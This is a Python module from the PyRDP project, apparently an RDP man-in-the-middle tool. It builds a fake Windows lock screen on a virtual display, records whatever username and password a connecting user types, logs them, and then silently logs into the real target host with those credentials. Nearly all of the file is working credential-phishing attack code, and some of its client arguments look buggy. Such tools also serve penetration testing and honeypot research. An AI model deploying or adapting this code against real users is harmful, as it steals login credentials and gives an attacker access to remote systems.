#
# This file is part of the PyRDP project.
# Copyright (C) 2022
# Licensed under the GPLv3 or later.
#
import os, random, shutil, socket, subprocess, threading, time
from tkinter import *
from PIL import Image, ImageTk
from pyvirtualdisplay import Display

from logging import LoggerAdapter

BACKGROUND_COLOR = "#044a91"
IMAGES_DIR = os.path.dirname(__file__) + "/images"


class FakeLoginScreen:
    def __init__(self, log: LoggerAdapter, width=1920, height=1080):
        self.log = log
        self.clicked = False

        # root window
        # right now all Xephyr instances are merged together because of Tk but I don't know why this happens
        # asked here: https://stackoverflow.com/questions/74552455/
        self.root = Tk()
        self.root.attributes("-fullscreen", True)
        self.root.geometry(f"{width}x{height}")
        # TODO: only accepts main return key (not from numpad)
        self.root.bind("<Return>", self.on_click)

        self._set_background(width, height)
        self._set_entries()

        # frames for loading animation
        self.frame_count = 50
        self.frames = [
            PhotoImage(
                file=IMAGES_DIR + "/WindowsLoadingScreenSmall.gif",
                format=f"gif -index {i}",
                master=self.root,
            )
            for i in range(self.frame_count)
        ]

        # label for loading animation
        self.label_loading_animation = Label(self.root, borderwidth=0)

    def _set_background(self, width=1920, height=1080):
        # background file
        self.background_image = Image.open(
            IMAGES_DIR + "/WindowsLockScreen.png"
        ).resize((width, height))
        self.background = ImageTk.PhotoImage(self.background_image, master=self.root)

        # background label
        if (
            hasattr(self, "label_background")
            and self.label_background is not None
            and not self.clicked
        ):
            self.label_background.destroy()
        self.label_background = Label(self.root, image=self.background, borderwidth=0)
        self.label_background.place(x=0, y=0)
        self.label_background.lower()

    def _set_entries(self):
        # username entry
        self.entry_username = Entry(
            self.root,
            font=("Segoe UI", 13),
            bd=2,
            bg="white",
            insertofftime=600,
            insertwidth="1p",
            highlightthickness=1,
            highlightbackground="gray",
            highlightcolor="#eaeaea",
        )
        self.entry_username.place(
            relx=0.5, rely=0.61, anchor=CENTER, height=40, width=290
        )
        self.entry_username.focus()

        # password entry
        self.entry_password = Entry(
            self.root,
            show="•",
            font=("Segoe UI", 20),
            bd=2,
            bg="white",
            insertofftime=600,
            insertwidth="1p",
            highlightthickness=1,
            highlightbackground="gray",
            highlightcolor="gray",
        )
        # place password entry relative to username entry
        self.entry_password.place(
            in_=self.entry_username, height=40, width=257, relx=0, x=-3, rely=1.0, y=15
        )

        # login button - the image must be assigned to self to avoid garbage collection
        self.image_button_login = PhotoImage(
            file=IMAGES_DIR + "/LoginButton.png", master=self.root
        )
        self.button_login = Button(
            self.root,
            image=self.image_button_login,
            command=self.on_click,
            width=34,
            height=34,
            highlightthickness=1,
            highlightbackground="gray",
            highlightcolor="gray",
        )
        self.button_login.place(in_=self.entry_password, relx=1.0, x=-3, rely=0.0, y=-3)

    def show(self):
        # show window
        self.root.mainloop()

    def resize(self, width: int, height: int):
        self.root.geometry(f"{width}x{height}")
        self._set_background(width, height)

    def set_username(self, username: str):
        self.entry_username.delete(0, END)
        self.entry_username.insert(0, username)
        self.entry_password.focus()

    def on_click(self, event=None):
        self.clicked = True
        self.username = self.entry_username.get()
        self.password = self.entry_password.get()
        self.log.info(
            "Obtained %(username)s:%(password)s in fake server",
            {"username": self.username, "password": self.password},
        )
        # block pressing enter
        self.root.unbind("<Return>")
        # replace background (didn't find a less clunky way)
        self.background_image.paste(
            BACKGROUND_COLOR,
            [0, 0, self.background_image.size[0], self.background_image.size[1]],
        )
        self.background = ImageTk.PhotoImage(self.background_image, master=self.root)
        self.label_background.configure(image=self.background)
        # place label for loading animation
        self.label_loading_animation.place(relx=0.42, rely=0.35)
        # remove items
        self.entry_username.destroy()
        self.entry_password.destroy()
        self.button_login.destroy()
        # quit
        self.root.destroy()

    def show_loading_animation(self, index):
        if index == self.frame_count:
            self.root.destroy()
            return
        self.label_loading_animation.configure(image=self.frames[index])
        self.root.after(100, self.show_loading_animation, index + 1)


class FakeServer(threading.Thread):
    def __init__(self, targetHost: str, targetPort: int, log: LoggerAdapter):
        super().__init__()
        self.targetHost = targetHost
        self.targetPort = targetPort
        self.log = log

        self._launch_display()

        self.fakeLoginScreen = None

        self.port = 3389 + random.randint(1, 10000)
        self._launch_rdp_server()

    def _launch_display(self, width=1920, height=1080):
        self.display = Display(
            backend="xephyr",
            size=(width, height),
            extra_args=["-no-host-grab", "-noreset"],
        )  # noreset for xsetroot required
        self.display.start()
        self.display.env()
        # set background to windows blue
        self.xsetroot_process = subprocess.Popen(
            [
                shutil.which("xsetroot"),
                "-solid",
                BACKGROUND_COLOR,
            ]
        )

    def _launch_rdp_server(self):
        # TODO check if port is not already taken
        self.log.info(
            "Launching freerdp-shadow-cli (RDP Server) on port %(port)d",
            {"port": self.port},
        )
        rdp_server_cmd = [
            shutil.which("freerdp-shadow-cli"),
            "/bind-address:127.0.0.1",
            "/port:" + str(self.port),
            "/sec:tls",
            "-auth",
        ]
        self.rdp_server_process = subprocess.Popen(rdp_server_cmd)
        # TODO: fix cert on fake server

        # wait for the server to accept connections
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # FIXME maybe configure listen address
        ctr = 0
        threshold = 5
        while sock.connect_ex(("127.0.0.1", self.port)) != 0:
            self.log.info("Fake server is not running yet")
            time.sleep(0.1)
            if ctr > threshold:
                self.log.info(
                    "RDP server process did not launch within time, retrying..."
                )
                self.rdp_server_process.kill()
                self._launch_rdp_server()
                break
        sock.close()

    def run(self):
        self.fakeLoginScreen = FakeLoginScreen(self.log)
        self.fakeLoginScreen.show()
        username = self.fakeLoginScreen.username
        password = self.fakeLoginScreen.password
        self.fakeLoginScreen = None

        rdp_client_cmd = [
            shutil.which("xfreerdp"),
            "/v:" + self.targetHost,
            "/p:" + str(self.targetPort),
            "/u:" + username,
            "/p:" + password,
            "/cert:ignore",
            "/f",
            "-toggle-fullscreen",
            "/log-level:ERROR",
        ]
        self.rdp_client_process = subprocess.run(rdp_client_cmd)
        self.terminate()

    def resize(self, width: int, height: int):
        subprocess.run(
            [
                "xdotool",
                "search",
                "--name",
                "Xephyr",
                "windowsize",
                str(width),
                str(height),
            ],
            env={"DISPLAY": ":0"},
        )
        if self.fakeLoginScreen is not None:
            self.fakeLoginScreen.resize(width, height)

    def set_username(self, username: str):
        # FIXME: properly solve this concurrency
        if self.fakeLoginScreen is None:
            time.sleep(0.1)
        if self.fakeLoginScreen is not None:
            self.fakeLoginScreen.set_username(username)

    def terminate(self):
        # TODO: the user sees "An internal error has occurred."
        for proc in (
            self.rdp_server_process,
            self.xsetroot_process,
            self.rdp_client_process,
        ):
            if not isinstance(proc, subprocess.CompletedProcess):
                proc.kill()
        self.display.stop()
